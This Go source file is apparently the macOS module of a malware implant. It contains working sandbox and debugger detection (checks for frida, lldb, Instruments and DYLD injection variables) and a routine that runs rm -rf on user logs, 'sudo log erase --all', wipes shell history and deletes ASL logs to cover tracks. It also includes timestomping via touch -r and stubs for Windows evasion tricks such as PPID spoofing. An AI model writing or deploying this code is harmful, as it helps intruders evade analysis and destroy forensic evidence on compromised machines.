//go:build darwin

package implant

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"
)

// CheckSandboxDarwin detects common macOS sandbox/analysis environments.
func CheckSandboxDarwin() bool {
	// Check for common analysis tools
	analysisTools := []string{
		"/Applications/Instruments.app",
		"/usr/local/bin/frida",
		"/usr/bin/lldb",
	}
	for _, tool := range analysisTools {
		if _, err := os.Stat(tool); err == nil {
			return true // analysis tool found
		}
	}

	// Check for suspicious environment variables (DYLD injection, Frida, etc.)
	suspiciousEnv := []string{"DYLD_INSERT_LIBRARIES", "FRIDA_", "OBJC_DISABLE"}
	for _, env := range suspiciousEnv {
		for _, e := range os.Environ() {
			if strings.HasPrefix(e, env) {
				return true
			}
		}
	}

	// Check low CPU count (VMs often have 1 CPU)
	if checkCPUCount() {
		return true
	}

	// Check for known sandbox hostnames
	if checkHostname() {
		return true
	}

	return false
}

// SleepEncryptedDarwin — macOS has no NT API equivalents for Ekko-style
// memory encryption. Fall back to jittered sleep.
// Future: use mprotect(PROT_NONE) to hide memory pages during sleep.
func SleepEncryptedDarwin(sleepSec, jitterPct int, _ []byte) {
	SleepWithJitter(sleepSec, jitterPct)
}

// ClearMacOSLogs clears macOS system logs and shell history to cover tracks.
func ClearMacOSLogs() []string {
	results := []string{}

	cmds := []struct{ cmd, desc string }{
		{`rm -rf ~/Library/Logs/* 2>/dev/null`, "User logs"},
		{`sudo log erase --all 2>/dev/null`, "System unified log"},
		{`history -c 2>/dev/null; > ~/.bash_history; > ~/.zsh_history`, "Shell history"},
		{`sudo rm -rf /private/var/log/asl/*.asl 2>/dev/null`, "ASL logs"},
	}

	for _, c := range cmds {
		_, err := ExecuteShell([]string{c.cmd})
		if err == nil {
			results = append(results, "[+] Cleared: "+c.desc)
		} else {
			results = append(results, "[-] Failed: "+c.desc)
		}
	}
	return results
}

// HeapEncryptSleepDarwin is a stub for interface consistency with Windows.
// macOS does not use Windows heap APIs.
func HeapEncryptSleepDarwin(sleepSec, jitterPct int) {
	time.Sleep(time.Duration(sleepSec) * time.Second)
}

// SleepEncrypted on Darwin falls back to jittered sleep (no NT API equivalents).
func SleepEncrypted(sleepSec, jitterPct int, _ []byte) {
	SleepWithJitter(sleepSec, jitterPct)
}

// SyscallStub / GetSyscallStub — Windows-only concept, stubs for Darwin.
type SyscallStub struct {
	SSN     uint16
	Address uintptr
}

func GetSyscallStub(funcName string) (*SyscallStub, error) {
	return nil, fmt.Errorf("indirect syscalls not supported on darwin")
}

func SpawnWithParentSpoof(parentPID uint32, cmdLine string) error {
	return fmt.Errorf("PPID spoofing not supported on darwin")
}

func FindProcessByName(name string) (uint32, error) {
	return 0, fmt.Errorf("not supported on darwin")
}

func SpoofCallStack() {}

// Timestomp on macOS uses touch -r.
func Timestomp(filepath string, referenceFile string) error {
	return exec.Command("touch", "-r", referenceFile, filepath).Run()
}

// ClearWindowsLogs is a no-op on macOS; use ClearPlatformLogs instead.
func ClearWindowsLogs() []string {
	return ClearMacOSLogs()
}

// ClearPlatformLogs routes to the macOS log cleaner.
func ClearPlatformLogs() []string {
	return ClearMacOSLogs()
}
